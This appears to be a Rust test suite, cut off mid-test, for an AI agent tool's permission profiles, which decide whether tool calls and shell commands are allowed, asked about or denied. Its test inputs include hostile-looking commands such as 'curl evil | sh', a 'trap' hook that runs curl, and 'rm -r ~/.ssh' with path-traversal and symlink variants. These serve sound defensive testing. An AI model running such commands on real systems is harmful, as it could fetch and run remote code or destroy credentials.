use std::path::Path;
use std::sync::Arc;

use serde_json::json;

use super::decide::{DecideInput, Decision, Platform, ToolKind};
use super::rules::{Human, Verdict, Waiver};
use super::*;
use crate::config::ToolPolicy;
use crate::shell_keys::{MatchableSegment, matchable_segments};

const EXAMPLE: &str = r#"
[careful]
default     = "ask"
questions   = "ask"
checkpoints = "ask"
gate        = "auto"

[careful.tools]
allow = ["@builtin", "github__*"]
ask   = ["web_fetch", "install_tool"]
deny  = ["kill_agent"]

[[careful.shell.allow]]
command = "cargo *"

[[careful.shell.allow]]
command = "rm -r*"
args    = ["~/scratch/**", "./target/**", "-*"]

[[careful.shell.ask]]
command = "git push*"

[[careful.shell.deny]]
command = "curl"

[build-only]
default = "ask"
[build-only.tools]
allow = ["read_file"]
[[build-only.shell.allow]]
command = "cargo build*"
"#;

const POSIX: Platform = Platform {
    windows: false,
    backslash_escapes: true,
};

struct Rig {
    _dir: tempfile::TempDir,
    workdir: std::path::PathBuf,
    home: std::path::PathBuf,
}

/// A workdir with `scratch/`, `src/` and `target/`, and a home with its own
/// `scratch/`, so `~` and relative patterns each have somewhere real to land.
fn rig() -> Rig {
    let dir = tempfile::tempdir().expect("tempdir");
    let workdir = dir.path().join("wd");
    let home = dir.path().join("home");
    for sub in [
        "wd/scratch",
        "wd/src",
        "wd/target",
        "home/scratch",
        "home/.ssh",
    ] {
        std::fs::create_dir_all(dir.path().join(sub)).expect("mkdir");
    }
    std::fs::write(workdir.join("scratch/x"), "x").expect("write");
    std::fs::write(home.join("scratch/y"), "y").expect("write");
    Rig {
        _dir: dir,
        workdir: std::fs::canonicalize(&workdir).expect("canonical"),
        home: std::fs::canonicalize(&home).expect("canonical"),
    }
}

fn file() -> YoloFile {
    YoloFile::from_toml(EXAMPLE).expect("example parses")
}

fn careful() -> Arc<YoloProfile> {
    file().get("careful").expect("careful exists")
}

fn profile(toml: &str) -> Arc<YoloProfile> {
    let file = YoloFile::from_toml(toml).expect("profile parses");
    file.get("p").expect("profile named p")
}

/// One call to decide, with the inputs a test rarely varies defaulted.
struct Call<'a> {
    tool: &'a str,
    arguments: serde_json::Value,
    configured: ToolPolicy,
    kind: ToolKind,
    launch_allowed: bool,
    platform: Platform,
}

impl<'a> Call<'a> {
    fn new(tool: &'a str, arguments: serde_json::Value, configured: ToolPolicy) -> Self {
        Self {
            tool,
            arguments,
            configured,
            kind: ToolKind::Builtin,
            launch_allowed: false,
            platform: POSIX,
        }
    }
}

fn decide_with(profile: &YoloProfile, rig: &Rig, call: Call<'_>) -> Decision {
    profile.decide(&DecideInput {
        tool: call.tool,
        arguments: &call.arguments,
        configured: call.configured,
        launch_allowed: call.launch_allowed,
        kind: call.kind,
        workdir: &rig.workdir,
        home: Some(&rig.home),
        platform: call.platform,
    })
}

fn shell(profile: &YoloProfile, rig: &Rig, command: &str, configured: ToolPolicy) -> Decision {
    decide_with(
        profile,
        rig,
        Call::new("shell", json!({ "command": command }), configured),
    )
}

fn tool(
    profile: &YoloProfile,
    rig: &Rig,
    name: &str,
    configured: ToolPolicy,
    kind: ToolKind,
) -> ToolPolicy {
    decide_with(
        profile,
        rig,
        Call {
            kind,
            ..Call::new(name, json!({}), configured)
        },
    )
    .policy
}

// ---- the file ----

#[test]
fn the_example_parses_into_its_profiles() {
    let file = file();
    assert!(file.exists());
    assert_eq!(file.names(), ["build-only", "careful"]);
    assert_eq!(file.profiles().count(), 2);
    let summary = careful().summary();
    assert_eq!(summary.name, "careful");
    assert_eq!(summary.default, Waiver::Ask);
    assert_eq!(summary.questions, Human::Ask);
    assert_eq!(summary.checkpoints, Human::Ask);
    assert_eq!(summary.gate, Human::Auto);
    assert_eq!(summary.tool_rules, [2, 2, 1]);
    assert_eq!(summary.shell_rules, [2, 1, 1]);
    let json = serde_json::to_value(&summary).expect("serializes");
    assert_eq!(json["default"], "ask");
    assert_eq!(json["gate"], "auto");
}

#[test]
fn the_human_knobs_default_to_auto_and_are_serialized_back() {
    let p = profile("[p]\ndefault = \"allow\"\n");
    assert_eq!(p.spec.questions, Human::Auto);
    assert_eq!(p.spec.checkpoints, Human::Auto);
    assert_eq!(p.spec.gate, Human::Auto);
    assert!(p.spec.questions.is_auto());
    assert!(!Human::Ask.is_auto());
    let text = toml::to_string(&p.spec).expect("spec serializes");
    assert!(text.contains("default = \"allow\""), "{text}");
    assert!(!p.is_builtin_default());
}

#[test]
fn a_profile_without_default_is_refused() {
    let err = YoloFile::from_toml("[p]\nquestions = \"ask\"\n").expect_err("no default");
    let text = err.to_string();
    assert!(text.contains("does not load"), "{text}");
    assert!(text.contains("default"), "{text}");
}

#[test]
fn an_unknown_key_is_refused() {
    let err =
        YoloFile::from_toml("[p]\ndefault = \"allow\"\nblock = []\n").expect_err("unknown key");
    assert!(matches!(err, YoloError::Parse(_)), "{err:?}");
}

#[test]
fn names_are_checked() {
    let err = YoloFile::from_toml("[default]\ndefault = \"allow\"\n").expect_err("reserved");
    assert!(
        matches!(&err, YoloError::Name { name, .. } if name == "default"),
        "{err:?}"
    );
    assert!(err.to_string().contains("bare --yolo"), "{err}");

    let err = YoloFile::from_toml("[\"my profile\"]\ndefault = \"allow\"\n").expect_err("space");
    assert!(
        matches!(&err, YoloError::Name { name, .. } if name == "my profile"),
        "{err:?}"
    );
    assert!(err.to_string().contains("--yolo=<name>"), "{err}");

    assert!(validate_name("ok-name_1").is_ok());
    assert!(validate_name("").is_err());
}

#[test]
fn bad_entries_are_refused_by_name() {
    let cases = [
        (
            "[p]\ndefault = \"allow\"\n[p.tools]\nallow = [\"@builtins\"]\n",
            "@builtins",
            "not a tool group",
        ),
        (
            "[p]\ndefault = \"allow\"\n[p.tools]\nallow = [\"git[\"]\n",
            "git[",
            "not a valid glob",
        ),
        (
            "[p]\ndefault = \"allow\"\n[p.tools]\nallow = [\" \"]\n",
            " ",
            "empty entry",
        ),
        (
            "[p]\ndefault = \"allow\"\n[[p.shell.allow]]\ncommand = \" \"\n",
            "",
            "empty command",
        ),
        (
            "[p]\ndefault = \"allow\"\n[[p.shell.allow]]\ncommand = \"ls [\"\n",
            "ls [",
            "not a valid glob",
        ),
        (
            "[p]\ndefault = \"allow\"\n[[p.shell.allow]]\ncommand = \"ls\"\nargs = [\"\"]\n",
            "ls",
            "empty args pattern",
        ),
        (
            "[p]\ndefault = \"allow\"\n[[p.shell.allow]]\ncommand = \"ls\"\nargs = [\"[\"]\n",
            "ls",
            "not a valid glob",
        ),
    ];
    for (toml, entry, reason) in cases {
        let err = YoloFile::from_toml(toml).expect_err(toml);
        let YoloError::Rule { profile, error } = &err else {
            panic!("expected a rule error for {toml}, got {err:?}");
        };
        assert_eq!(profile, "p");
        assert_eq!(error.entry, entry, "{toml}");
        assert!(error.reason.contains(reason), "{toml}: {}", error.reason);
        let text = err.to_string();
        assert!(text.contains("[p]"), "{text}");
    }
}

#[test]
fn resolve_picks_the_builtin_default_for_the_bare_flag() {
    let path = Path::new("/nowhere/yolo.toml");
    for name in [None, Some("")] {
        let p = file().resolve(name, path).expect("bare flag");
        assert!(p.is_builtin_default());
        assert_eq!(p.spec, rules::ProfileSpec::builtin_default());
        assert!(p.holds().is_empty());
    }
    let p = YoloFile::missing()
        .resolve(None, path)
        .expect("bare flag needs no file");
    assert!(p.is_builtin_default());
}

#[test]
fn resolve_names_what_is_missing() {
    let path = Path::new("/nowhere/yolo.toml");
    let err = file().resolve(Some("nope"), path).expect_err("unknown");
    assert_eq!(
        err,
        YoloError::UnknownProfile {
            name: "nope".to_string(),
            known: vec!["build-only".to_string(), "careful".to_string()],
        }
    );
    assert!(err.to_string().contains("build-only, careful"), "{err}");

    let empty = YoloFile::from_toml("").expect("empty file");
    assert!(empty.exists());
    let err = empty.resolve(Some("nope"), path).expect_err("no profiles");
    assert!(err.to_string().contains("defines no profiles"), "{err}");

    let missing = YoloFile::default();
    assert!(!missing.exists());
    let err = missing.resolve(Some("nope"), path).expect_err("no file");
    assert!(
        matches!(&err, YoloError::NoFile { name, .. } if name == "nope"),
        "{err:?}"
    );
    assert!(err.to_string().contains("lev yolo init"), "{err}");
}

#[test]
fn load_from_reads_missing_broken_and_good_files() {
    let dir = tempfile::tempdir().expect("tempdir");
    let path = dir.path().join("yolo.toml");
    assert!(
        !YoloFile::load_from(&path)
            .expect("missing is fine")
            .exists()
    );
    std::fs::write(&path, "this is not toml [").expect("write");
    assert!(matches!(
        YoloFile::load_from(&path),
        Err(YoloError::Parse(_))
    ));
    std::fs::write(&path, EXAMPLE).expect("write");
    assert_eq!(YoloFile::load_from(&path).expect("good").names().len(), 2);
    // A directory reads with an error that is not NotFound.
    assert!(matches!(
        YoloFile::load_from(dir.path()),
        Err(YoloError::Parse(_))
    ));
}

#[test]
fn yolo_path_sits_beside_the_config_file() {
    crate::config::with_isolated_config_path("yolo_path_beside_config", |dir| {
        assert_eq!(yolo_path(), dir.join(FILE_NAME));
    });
}

#[test]
fn holds_describe_what_still_reaches_a_person() {
    let lines = careful().holds();
    assert_eq!(lines.len(), 4, "{lines:?}");
    assert!(lines[0].contains("questions"), "{lines:?}");
    assert!(lines[1].contains("checkpoint"), "{lines:?}");
    assert!(lines[2].contains("lists do not allow"), "{lines:?}");
    assert!(
        lines[3].contains("web_fetch") && lines[3].contains("shell `git push*`"),
        "{lines:?}"
    );

    let gate = profile("[p]\ndefault = \"allow\"\ngate = \"ask\"\n");
    let lines = gate.holds();
    assert_eq!(lines.len(), 1);
    assert!(lines[0].contains("taint-gate"), "{lines:?}");
}

#[test]
fn verdicts_order_and_print() {
    assert_eq!(Verdict::Allow.stricter(Verdict::Ask), Verdict::Ask);
    assert_eq!(Verdict::Deny.stricter(Verdict::Ask), Verdict::Deny);
    assert_eq!(Verdict::Ask.stricter(Verdict::Ask), Verdict::Ask);
    assert_eq!(Verdict::Allow.policy(), ToolPolicy::Allow);
    assert_eq!(Verdict::Ask.policy(), ToolPolicy::Ask);
    assert_eq!(Verdict::Deny.policy(), ToolPolicy::Deny);
    assert_eq!(Waiver::Allow.verdict(), Verdict::Allow);
    assert_eq!(
        format!("{} {} {}", Verdict::Allow, Verdict::Ask, Verdict::Deny),
        "allow ask deny"
    );
}

// ---- tool decisions ----

#[test]
fn a_configured_deny_is_terminal() {
    let rig = rig();
    let p = profile("[p]\ndefault = \"allow\"\n[p.tools]\nallow = [\"@all\"]\n");
    let d = decide_with(
        &p,
        &rig,
        Call {
            tool: "web_fetch",
            arguments: json!({}),
            configured: ToolPolicy::Deny,
            kind: ToolKind::Builtin,
            launch_allowed: true,
            platform: POSIX,
        },
    );
    assert_eq!(d.policy, ToolPolicy::Deny);
    assert!(d.reason.contains("no profile lifts a deny"), "{}", d.reason);
    // Through the shell path too.
    let d = shell(&p, &rig, "ls", ToolPolicy::Deny);
    assert_eq!(d.policy, ToolPolicy::Deny);
}

#[test]
fn lists_take_precedence_deny_then_ask_then_allow() {
    let rig = rig();
    let p = profile(
        "[p]\ndefault = \"allow\"\n[p.tools]\nallow = [\"@all\"]\nask = [\"web_*\"]\ndeny = [\"web_fetch\"]\n",
    );
    assert_eq!(
        tool(&p, &rig, "web_fetch", ToolPolicy::Ask, ToolKind::Builtin),
        ToolPolicy::Deny
    );
    assert_eq!(
        tool(&p, &rig, "web_search", ToolPolicy::Allow, ToolKind::Builtin),
        ToolPolicy::Ask
    );
    assert_eq!(
        tool(&p, &rig, "edit_file", ToolPolicy::Ask, ToolKind::Builtin),
        ToolPolicy::Allow
    );
    let d = decide_with(
        &p,
        &rig,
        Call {
            tool: "web_search",
            arguments: json!({}),
            configured: ToolPolicy::Ask,
            kind: ToolKind::Builtin,
            launch_allowed: false,
            platform: POSIX,
        },
    );
    assert!(
        d.reason.contains("tools ask list entry \"web_*\""),
        "{}",
        d.reason
    );
}

#[test]
fn a_launch_allow_survives_an_ask_list_but_not_a_deny() {
    let rig = rig();
    let p = profile(
        "[p]\ndefault = \"ask\"\n[p.tools]\nask = [\"web_fetch\"]\ndeny = [\"kill_agent\"]\n",
    );
    let d = decide_with(
        &p,
        &rig,
        Call {
            tool: "web_fetch",
            arguments: json!({}),
            configured: ToolPolicy::Allow,
            kind: ToolKind::Builtin,
            launch_allowed: true,
            platform: POSIX,
        },
    );
    assert_eq!(d.policy, ToolPolicy::Allow);
    assert!(d.reason.contains("config already allows"), "{}", d.reason);
    let d = decide_with(
        &p,
        &rig,
        Call {
            tool: "kill_agent",
            arguments: json!({}),
            configured: ToolPolicy::Allow,
            kind: ToolKind::Subagent,
            launch_allowed: true,
            platform: POSIX,
        },
    );
    assert_eq!(d.policy, ToolPolicy::Deny);
}

#[test]
fn the_default_applies_only_to_a_configured_ask() {
    let rig = rig();
    let ask = profile("[p]\ndefault = \"ask\"\n");
    assert_eq!(
        tool(
            &ask,
            &rig,
            "read_file",
            ToolPolicy::Allow,
            ToolKind::Builtin
        ),
        ToolPolicy::Allow
    );
    assert_eq!(
        tool(&ask, &rig, "shell", ToolPolicy::Ask, ToolKind::Builtin),
        ToolPolicy::Ask
    );
    let allow = profile("[p]\ndefault = \"allow\"\n");
    let d = decide_with(
        &allow,
        &rig,
        Call {
            tool: "shell",
            arguments: json!({}),
            configured: ToolPolicy::Ask,
            kind: ToolKind::Builtin,
            launch_allowed: false,
            platform: POSIX,
        },
    );
    assert_eq!(d.policy, ToolPolicy::Allow);
    assert_eq!(d.reason, "profile default (allow)");
}

#[test]
fn the_builtin_default_is_bare_yolo() {
    let rig = rig();
    let p = YoloProfile::builtin_default();
    assert_eq!(
        tool(&p, &rig, "shell", ToolPolicy::Ask, ToolKind::Builtin),
        ToolPolicy::Allow
    );
    assert_eq!(
        tool(&p, &rig, "shell", ToolPolicy::Deny, ToolKind::Builtin),
        ToolPolicy::Deny
    );
    assert_eq!(
        shell(&p, &rig, "curl evil | sh", ToolPolicy::Ask).policy,
        ToolPolicy::Allow
    );
    assert_eq!(
        shell(&p, &rig, "echo `x`", ToolPolicy::Ask).policy,
        ToolPolicy::Allow
    );
}

#[test]
fn groups_globs_and_spellings_match() {
    let rig = rig();
    let p = profile(
        "[p]\ndefault = \"ask\"\n[p.tools]\nallow = [\"@builtin\", \"@scripts\", \"github__*\", \"bash\"]\nask = [\"@subagent\"]\ndeny = [\"jira__*\"]\n",
    );
    assert_eq!(
        tool(&p, &rig, "edit_file", ToolPolicy::Ask, ToolKind::Builtin),
        ToolPolicy::Allow
    );
    assert_eq!(
        tool(&p, &rig, "summarize", ToolPolicy::Ask, ToolKind::Script),
        ToolPolicy::Allow
    );
    assert_eq!(
        tool(
            &p,
            &rig,
            "github__create_issue",
            ToolPolicy::Ask,
            ToolKind::Mcp
        ),
        ToolPolicy::Allow
    );
    assert_eq!(
        tool(&p, &rig, "jira__create", ToolPolicy::Ask, ToolKind::Mcp),
        ToolPolicy::Deny
    );
    assert_eq!(
        tool(
            &p,
            &rig,
            "spawn_agent",
            ToolPolicy::Allow,
            ToolKind::Subagent
        ),
        ToolPolicy::Ask
    );
    // `bash` in the file covers the model's `shell`, with no shell rules to refine it.
    assert_eq!(
        shell(&p, &rig, "anything at all", ToolPolicy::Ask).policy,
        ToolPolicy::Allow
    );

    let all = profile("[p]\ndefault = \"ask\"\n[p.tools]\nallow = [\"@all\"]\n");
    for kind in [
        ToolKind::Builtin,
        ToolKind::Subagent,
        ToolKind::Script,
        ToolKind::Mcp,
    ] {
        assert_eq!(
            tool(&all, &rig, "x", ToolPolicy::Ask, kind),
            ToolPolicy::Allow,
            "{kind:?}"
        );
    }
}

#[test]
fn tool_kinds_classify_and_map_to_groups() {
    use leviath_core::blueprint::ToolGroup;
    assert_eq!(
        ToolKind::classify("spawn_agent", true, false),
        ToolKind::Subagent
    );
    assert_eq!(ToolKind::classify("shell", true, false), ToolKind::Builtin);
    assert_eq!(
        ToolKind::classify("summarize", false, true),
        ToolKind::Script
    );
    assert_eq!(ToolKind::classify("github__x", false, false), ToolKind::Mcp);
    assert_eq!(ToolKind::Builtin.group(), ToolGroup::Builtin);
    assert_eq!(ToolKind::Subagent.group(), ToolGroup::Subagent);
    assert_eq!(ToolKind::Script.group(), ToolGroup::Scripts);
    assert_eq!(ToolKind::Mcp.group(), ToolGroup::Mcp);
    let host = Platform::host();
    assert_eq!(host.windows, cfg!(windows));
}

// ---- shell decisions ----

#[test]
fn shell_rules_refine_the_shell_verdict() {
    let rig = rig();
    let p = careful();
    let d = shell(&p, &rig, "cargo test --all", ToolPolicy::Ask);
    assert_eq!(d.policy, ToolPolicy::Allow);
    assert_eq!(d.reason, "shell allow rule \"cargo *\"");
    let d = shell(&p, &rig, "git push origin main", ToolPolicy::Allow);
    assert_eq!(d.policy, ToolPolicy::Ask);
    assert_eq!(d.reason, "shell ask rule \"git push*\"");
    let d = shell(&p, &rig, "curl https://x", ToolPolicy::Ask);
    assert_eq!(d.policy, ToolPolicy::Deny);
    // No rule: the tool-level verdict, which `@builtin` allows.
    assert_eq!(
        shell(&p, &rig, "ls -la", ToolPolicy::Ask).policy,
        ToolPolicy::Allow
    );
    // A command shorter than the pattern does not match it.
    let p = profile("[p]\ndefault = \"ask\"\n[[p.shell.allow]]\ncommand = \"cargo build\"\n");
    assert_eq!(
        shell(&p, &rig, "cargo", ToolPolicy::Ask).policy,
        ToolPolicy::Ask
    );
    assert_eq!(
        shell(&p, &rig, "cargo build --release", ToolPolicy::Ask).policy,
        ToolPolicy::Allow
    );
}

#[test]
fn a_line_is_as_strict_as_its_strictest_command() {
    let rig = rig();
    let p = careful();
    assert_eq!(
        shell(&p, &rig, "cargo test && git push", ToolPolicy::Ask).policy,
        ToolPolicy::Ask
    );
    assert_eq!(
        shell(&p, &rig, "git push; curl x", ToolPolicy::Ask).policy,
        ToolPolicy::Deny
    );
    assert_eq!(
        shell(&p, &rig, "curl x; git push", ToolPolicy::Ask).policy,
        ToolPolicy::Deny
    );
    assert_eq!(
        shell(&p, &rig, "cargo test | cargo fmt", ToolPolicy::Ask).policy,
        ToolPolicy::Allow
    );
}

#[test]
fn args_scope_a_command_to_paths() {
    let rig = rig();
    let p = careful();
    let allowed = format!("rm -r {}/scratch/x", rig.home.display());
    assert_eq!(
        shell(&p, &rig, &allowed, ToolPolicy::Ask).policy,
        ToolPolicy::Allow
    );
    assert_eq!(
        shell(&p, &rig, "rm -rf ~/scratch/y", ToolPolicy::Ask).policy,
        ToolPolicy::Allow
    );
    assert_eq!(
        shell(&p, &rig, "rm -r target/debug", ToolPolicy::Ask).policy,
        ToolPolicy::Allow
    );
    assert_eq!(
        shell(&p, &rig, "rm -r ./target/debug -f", ToolPolicy::Ask).policy,
        ToolPolicy::Allow
    );
    // Outside: the tool-level verdict, which for `careful` is allow via
    // `@builtin`, so use a profile whose shell base asks.
    let p = profile(
        "[p]\ndefault = \"ask\"\n[[p.shell.allow]]\ncommand = \"rm -r*\"\nargs = [\"~/scratch/**\", \"target/**\"]\n",
    );
    assert_eq!(
        shell(&p, &rig, "rm -r target/debug", ToolPolicy::Ask).policy,
        ToolPolicy::Allow
    );
    assert_eq!(
        shell(&p, &rig, "rm -r src/x", ToolPolicy::Ask).policy,
        ToolPolicy::Ask
    );
    assert_eq!(
        shell(&p, &rig, "rm -r ~/.ssh", ToolPolicy::Ask).policy,
        ToolPolicy::Ask
    );
    assert_eq!(
        shell(&p, &rig, "rm -r ~/scratch/../.ssh", ToolPolicy::Ask).policy,
        ToolPolicy::Ask
    );
    assert_eq!(
        shell(&p, &rig, "rm -r target/../src/x", ToolPolicy::Ask).policy,
        ToolPolicy::Ask
    );
    // A flag is not a path, and nothing in `args` covers it here.
    assert_eq!(
        shell(&p, &rig, "rm -r -f target/debug", ToolPolicy::Ask).policy,
        ToolPolicy::Ask
    );
    // Climbing past the root names nothing.
    let deep = "../".repeat(64);
    assert_eq!(
        shell(&p, &rig, &format!("rm -r {deep}target"), ToolPolicy::Ask).policy,
        ToolPolicy::Ask
    );
    // Two paths, one outside: the whole command is outside.
    assert_eq!(
        shell(&p, &rig, "rm -r target/a src/b", ToolPolicy::Ask).policy,
        ToolPolicy::Ask
    );
    // Absolute pattern under the root matches anything under it.
    let p = profile(
        "[p]\ndefault = \"ask\"\n[[p.shell.allow]]\ncommand = \"rm -r*\"\nargs = [\"/**\"]\n",
    );
    assert_eq!(
        shell(&p, &rig, "rm -r src/x", ToolPolicy::Ask).policy,
        ToolPolicy::Allow
    );
}

#[test]
fn empty_args_means_no_arguments() {
    let rig = rig();
    let p = profile(
        "[p]\ndefault = \"ask\"\n[[p.shell.allow]]\ncommand = \"cargo build\"\nargs = []\n",
    );
    assert_eq!(
        shell(&p, &rig, "cargo build", ToolPolicy::Ask).policy,
        ToolPolicy::Allow
    );
    assert_eq!(
        shell(&p, &rig, "cargo build --release", ToolPolicy::Ask).policy,
        ToolPolicy::Ask
    );
}

#[test]
fn a_tilde_with_no_home_matches_nothing() {
    let rig = rig();
    let p = profile(
        "[p]\ndefault = \"ask\"\n[[p.shell.allow]]\ncommand = \"rm -r*\"\nargs = [\"~/scratch/**\"]\n",
    );
    let args = json!({ "command": "rm -r ~/scratch/y" });
    let no_home = |cmd: &serde_json::Value| {
        p.decide(&DecideInput {
            tool: "shell",
            arguments: cmd,
            configured: ToolPolicy::Ask,
            launch_allowed: false,
            kind: ToolKind::Builtin,
            workdir: &rig.workdir,
            home: None,
            platform: POSIX,
        })
        .policy
    };
    assert_eq!(no_home(&args), ToolPolicy::Ask);
    // The word has no `~`, but the pattern does: still nothing to expand it to.
    let abs = json!({ "command": format!("rm -r {}/scratch/y", rig.home.display()) });
    assert_eq!(no_home(&abs), ToolPolicy::Ask);
    // A bare `~` word expands to the home itself when there is one.
    let p =
        profile("[p]\ndefault = \"ask\"\n[[p.shell.allow]]\ncommand = \"ls\"\nargs = [\"~\"]\n");
    assert_eq!(
        shell(&p, &rig, "ls ~", ToolPolicy::Ask).policy,
        ToolPolicy::Allow
    );
}

#[cfg(unix)]
#[test]
fn a_symlink_out_of_the_allowed_tree_does_not_pass() {
    let rig = rig();
    std::os::unix::fs::symlink(rig.home.join(".ssh"), rig.workdir.join("target/link"))
        .expect("symlink");
    let p = profile(
        "[p]\ndefault = \"ask\"\n[[p.shell.allow]]\ncommand = \"rm -r*\"\nargs = [\"target/**\"]\n",
    );
    assert_eq!(
        shell(&p, &rig, "rm -r target/link", ToolPolicy::Ask).policy,
        ToolPolicy::Ask
    );
    assert_eq!(
        shell(&p, &rig, "rm -r target/other", ToolPolicy::Ask).policy,
        ToolPolicy::Allow
    );
}

#[test]
fn windows_paths_normalise_and_fold_case() {
    let rig = rig();
    let p = profile(
        "[p]\ndefault = \"ask\"\n[[p.shell.allow]]\ncommand = \"rm -r*\"\nargs = [\"target/**\", \"-*\"]\n",
    );
    let windows = Platform {
        windows: true,
        backslash_escapes: false,
    };
    let d = decide_with(
        &p,
        &rig,
        Call {
            tool: "shell",
            arguments: json!({ "command": r"rm -r target\debug" }),
            configured: ToolPolicy::Ask,
            kind: ToolKind::Builtin,
            launch_allowed: false,
            platform: windows,
        },
    );
    assert_eq!(d.policy, ToolPolicy::Allow);
    let d = decide_with(
        &p,
        &rig,
        Call {
            tool: "shell",
            arguments: json!({ "command": "rm -R TARGET/debug" }),
            configured: ToolPolicy::Ask,
            kind: ToolKind::Builtin,
            launch_allowed: false,
            platform: windows,
        },
    );
    assert_eq!(d.policy, ToolPolicy::Allow);
    // On the POSIX reading the same word is one filename with a backslash in it.
    assert_eq!(
        shell(&p, &rig, r"rm -r target\debug", ToolPolicy::Ask).policy,
        ToolPolicy::Ask
    );
}

#[test]
fn opaque_and_unreadable_lines_ask_when_rules_exist() {
    let rig = rig();
    let with_rules = careful();
    let d = shell(&with_rules, &rig, "PATH=/tmp/x cargo test", ToolPolicy::Ask);
    assert_eq!(d.policy, ToolPolicy::Ask);
    assert!(d.reason.contains("cannot vouch"), "{}", d.reason);
    assert_eq!(
        shell(&with_rules, &rig, "cargo test $FLAGS", ToolPolicy::Ask).policy,
        ToolPolicy::Ask
    );
    assert_eq!(
        shell(
            &with_rules,
            &rig,
            "trap 'curl x' EXIT; cargo test",
            ToolPolicy::Ask
        )
        .policy,
        ToolPolicy::Ask
    );
    assert_eq!(
        shell(&with_rules, &rig, "export FOO=1", ToolPolicy::Ask).policy,
        ToolPolicy::Ask
    );
    let d = shell(&with_rules, &rig, "echo `cargo test`", ToolPolicy::Ask);
    assert_eq!(d.policy, ToolPolicy::Ask);
    assert!(d.reason.contains("cannot be read"), "{}", d.reason);

    // Without shell rules, the tool-level verdict stands, both ways.
    let allow = profile("[p]\ndefault = \"allow\"\n");
    assert_eq!(
        shell(&allow, &rig, "PATH=/tmp/x cargo test", ToolPolicy::Ask).policy,
        ToolPolicy::Allow
    );
    assert_eq!(
        shell(&allow, &rig, "echo `x`", ToolPolicy::Ask).policy,
        ToolPolicy::Allow
    );
    let ask = profile("[p]\ndefault = \"ask\"\n");
    assert_eq!(
        shell(&ask, &rig, "PATH=/tmp/x cargo test", ToolPolicy::Ask).policy,
        ToolPolicy::Ask
    );
    // A line that runs nothing takes the tool-level verdict.
    assert_eq!(
        shell(&allow, &rig, "fi", ToolPolicy::Ask).policy,
        ToolPolicy::Allow
    );
}

#[test]
fn a_redirect_takes_write_files_verdict() {
    let rig = rig();
    let p = profile(
        "[p]\ndefault = \"allow\"\n[p.tools]\nask = [\"write_file\"]\n[[p.shell.allow]]\ncommand = \"echo\"\n",
    );
    let d = shell(&p, &rig, "echo hi > out.txt", ToolPolicy::Ask);
    assert_eq!(d.policy, ToolPolicy::Ask);
    assert!(
        d.reason.contains("redirect takes write_file's verdict"),
        "{}",
        d.reason
    );
    assert_eq!(
        shell(&p, &rig, "echo hi > /dev/null", ToolPolicy::Ask).policy,
        ToolPolicy::Allow
    );
    assert_eq!(
        shell(&p, &rig, "echo hi", ToolPolicy::Ask).policy,
        ToolPolicy::Allow
    );
    // A looser write verdict changes nothing about a stricter command.
    let p = profile(
        "[p]\ndefault = \"allow\"\n[p.tools]\nallow = [\"write_file\"]\n[[p.shell.ask]]\ncommand = \"echo\"\n",
    );
    let d = shell(&p, &rig, "echo hi > out.txt", ToolPolicy::Ask);
    assert_eq!(d.policy, ToolPolicy::Ask);
    assert_eq!(d.reason, "shell ask rule \"echo\"");
    // Denied write: the redirect is refused even under an allowing command.
    let p = profile(
        "[p]\ndefault = \"allow\"\n[p.tools]\ndeny = [\"write_file\"]\n[[p.shell.allow]]\ncommand = \"echo\"\n",
    );
    assert_eq!(
        shell(&p, &rig, "echo hi > out.txt", ToolPolicy::Ask).policy,
        ToolPolicy::Deny
    );
}

#[test]
fn a_shell_call_without_a_command_is_judged_by_name() {
    let rig = rig();
    let p = careful();
    assert_eq!(
        tool(&p, &rig, "shell", ToolPolicy::Ask, ToolKind::Builtin),
        ToolPolicy::Allow
    );
}

// ---- matchable segments ----

#[test]
fn matchable_segments_read_a_line_the_way_the_keys_do() {
    let seg = |words: &[&str], opaque: bool, writes: bool| MatchableSegment {
        words: words.iter().map(|w| w.to_string()).collect(),
        opaque,
        writes,
    };
    assert_eq!(
        matchable_segments("cargo test && rm -r 'a b' > out", true),
        Some(vec![
            seg(&["cargo", "test"], false, false),
            seg(&["rm", "-r", "a b"], false, true)
        ])
    );
    assert_eq!(
        matchable_segments("for i in 1 2; do echo $i; done", true),
        Some(vec![seg(&["echo", "i"], true, false)])
    );
    assert_eq!(
        matchable_segments("export FOO=1", true),
        Some(vec![seg(&[], true, false)])
    );
    assert_eq!(
        matchable_segments("FOO=1 ls", true),
        Some(vec![seg(&["ls"], true, false)])
    );
    assert_eq!(
        matchable_segments("trap 'x' EXIT", true),
        Some(vec![seg(&[], true, false)])
    );
    assert_eq!(
        matchable_segments("eval x", true),
        Some(vec![seg(&[], true, false)])
    );
    assert_eq!(
        matchable_segments("$CMD", true),
        Some(vec![seg(&[], true, false)])
    );
    assert_eq!(
        matchable_segments("fi > out", true),
        Some(vec![seg(&[], true, true)])
    );
    assert_eq!(matchable_segments("fi", true), Some(Vec::new()));
    assert_eq!(
        matchable_segments("echo 2>/dev/null", true),
        Some(vec![seg(&["echo"], false, false)])
    );
    assert_eq!(matchable_segments("echo `x`", true), None);
}

// ---- the spawn-time seams ----

#[test]
fn resolve_for_spawn_reads_the_file_only_for_a_named_profile() {
    crate::config::with_isolated_config_path("yolo_resolve_for_spawn", |dir| {
        assert_eq!(
            resolve_for_spawn(false, Some("careful")).expect("attended"),
            None
        );
        for bare in [None, Some("")] {
            let p = resolve_for_spawn(true, bare)
                .expect("bare")
                .expect("a profile");
            assert!(p.is_builtin_default());
        }
        // No file yet: a name has nothing to resolve against.
        let err = resolve_for_spawn(true, Some("careful")).expect_err("no file");
        assert!(matches!(err, YoloError::NoFile { .. }), "{err:?}");
        assert!(
            !load_current()
                .expect("a missing file loads as empty")
                .exists()
        );

        std::fs::write(dir.join(FILE_NAME), EXAMPLE).unwrap();
        let named = resolve_for_spawn(true, Some("careful"))
            .expect("named")
            .expect("a profile");
        assert_eq!(named.name, "careful");
        let err = resolve_for_spawn(true, Some("nope")).expect_err("unknown");
        assert!(matches!(err, YoloError::UnknownProfile { .. }), "{err:?}");
        assert_eq!(load_current().expect("loads").names().len(), 2);

        std::fs::write(dir.join(FILE_NAME), "[").unwrap();
        let err = resolve_for_spawn(true, Some("careful")).expect_err("broken file");
        assert!(matches!(err, YoloError::Parse(_)), "{err:?}");
    });
}

#[test]
fn the_shared_seam_passes_the_configured_policy_through_without_a_profile() {
    let rig = rig();
    let args = json!({});
    assert!(
        decide_under(
            None,
            "shell",
            &args,
            ToolPolicy::Ask,
            false,
            ToolKind::Builtin,
            &rig.workdir
        )
        .is_none()
    );
    assert_eq!(
        apply_profile(
            None,
            "shell",
            &args,
            ToolPolicy::Ask,
